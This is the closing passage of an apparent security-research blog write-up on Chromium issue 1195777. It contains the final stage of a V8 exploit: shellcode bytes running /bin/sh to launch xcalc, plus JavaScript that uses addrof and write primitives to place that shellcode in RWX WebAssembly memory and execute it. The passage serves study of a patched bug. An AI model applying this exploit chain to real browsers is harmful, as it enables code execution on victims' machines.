  <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0xb8</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x99</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span>
  <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x5e</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0xe8</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x4c</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0x3d</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span>
  <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x56</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x5e</span><span class=p>,</span>
  <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x0f</span><span class=p>,</span> <span class=mh>0x05</span>
<span class=p>]);</span>

<span class=kd>let</span> <span class=nx>buf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=nx>shellcode</span><span class=p>.</span><span class=nx>length</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>

<span class=nx>write</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>buf</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x14</span><span class=nx>n</span><span class=p>,</span> <span class=nx>rwx</span><span class=p>);</span>

<span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>shellcode</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span>
  <span class=nx>view</span><span class=p>.</span><span class=nx>setUint8</span><span class=p>(</span><span class=nx>i</span><span class=p>,</span> <span class=nx>shellcode</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>

<span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>main</span><span class=p>();</span></code></pre></div>
<h2 id=references>References</h2>
<ul>
<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">Issue 1195777: Incorrect representation change from Word64 to Word32</a></li>
</ul>
</div>
<footer class=content__footer></footer>
</section>
<footer class=page__footer><p>
</p>
<p>&copy; 2023 Anvbis</p>
<p>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p>
</footer>
</div>
</body>
</html>